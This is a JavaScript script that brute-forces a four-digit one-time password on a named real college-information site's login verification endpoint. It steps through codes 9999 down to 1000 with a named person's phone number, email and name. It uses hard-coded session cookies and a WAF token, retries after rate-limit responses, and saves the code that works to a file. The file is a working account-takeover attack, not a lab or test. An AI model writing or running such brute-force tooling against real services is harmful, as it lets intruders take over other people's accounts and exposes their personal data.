import fs from "fs";
async function tryOtp(otp) {
  const url = 'https://zollege.in/auth/otp-verification';

  const body = new URLSearchParams({
    otp_sent_on: 'phone',
    phone: '9658742589',
    email: 'aryanparikh@okyre.com',
    name: 'Aryan Parikh',
    country_code: '91',
    is_mobile: 'false',
    otp_form_source: 'login',
    is_client: '0',
    post_data: 'eyJwaG9uZV9ubyI6Ijc3Nzc3Nzc3NzciLCJjb3VudHJ5X2NvZGUiOiI5MSIsInVzZXJfY291bnRyeSI6IkluZGlhIn0=',
    hide_header: 'null',
    testimonialsData: '[object Object],[object Object],[object Object],[object Object],[object Object],[object Object],[object Object],[object Object]',
    otp: otp.toString(),
    device: 'desktop'
  });

  try {
    const response = await fetch(url, {
      method: 'POST',
      headers: {
        'Host': 'collegedunia.com',
        'Cookie': 'idu=c2N2MHU4NjV4Mm1pNGRwNDY4; collDunia=1942ajt1pi8q6len1khc61jglv; iduTrk=[object Object]; aws-waf-token=1fc664af-75fd-47e7-9a79-605b708ade94:BQoAZV5IANkEAAAA:Xf29kFrd84o3DV1bvvL54RVPCKhNsDl2tsFK+TmDWthMy7DMQVVz7RNIFUs/nLLrna1N9+AstaCE0tTHCQ3bIat3ymvcZQvydqsw38Pe/Ji80KdYnOzweQgvrtf40qsjUCLDbgCxu6yGMheHS33XmNQU/YTmGP1IyjDWdY1c9eVDR/1Gev1dmj3XYN6xaG8VsMBbrg==',
        'Cache-Control': 'max-age=0',
        'Sec-Ch-Ua-Platform': '"Linux"',
        'Authorization': 'Bearer',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
        'Accept': 'application/json',
        'Sec-Ch-Ua': '"Brave";v="137", "Chromium";v="137", "Not/A)Brand";v="24"',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Sec-Ch-Ua-Mobile': '?0',
        'Sec-Gpc': '1',
        'Accept-Language': 'en-GB,en;q=0.9',
        'Origin': 'https://collegedunia.com',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Referer': 'https://collegedunia.com/login',
        'Accept-Encoding': 'gzip, deflate, br',
        'Priority': 'u=1, i'
      },
      body: body.toString()
    });

    // Try to parse JSON, handle if not valid JSON (ratelimit or 503 response, etc)
    try {
      const result = await response.json();
      console.log(`OTP: ${otp} Response:`, result);

      if (result.success) {
        console.log(`Successful OTP found: ${otp}`);
        fs.writeFileSync('/home/lakshya/work/automation/zollege/successful_otp.txt', JSON.stringify(otp), 'utf8');
        return { success: true, jsonValid: true };
      }
      return { success: false, jsonValid: true };
    } catch(parseError) {
      // Not a valid JSON (maybe rate-limited), signal caller to handle with wait+retry
      console.error(`Invalid JSON for OTP ${otp}:`, parseError);
      return { success: false, jsonValid: false };
    }
  } catch (error) {
    console.error(`Error sending OTP ${otp}:`, error);
    return { success: false, jsonValid: false };
  }
}

async function wait(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

(async () => {
  let otp = 9999;
  while (otp >= 1000) {

    // Start inner retry loop for the same OTP if server returns invalid JSON
    let jsonValid = false;
    let result;
    while (!jsonValid) {
      result = await tryOtp(otp);
      jsonValid = result.jsonValid;
      if (!jsonValid) {
        console.log(`Invalid JSON for OTP ${otp}. Waiting for 15 seconds then retrying same OTP...`);
        await wait(15000); // 15 seconds
      }
    }

    // If OTP is successful, stop trying
    if (result.success) {
      console.log('Stopping further attempts.');
      break;
    }
    otp--;
  }
  console.log('Finished OTP attempts.');
})();
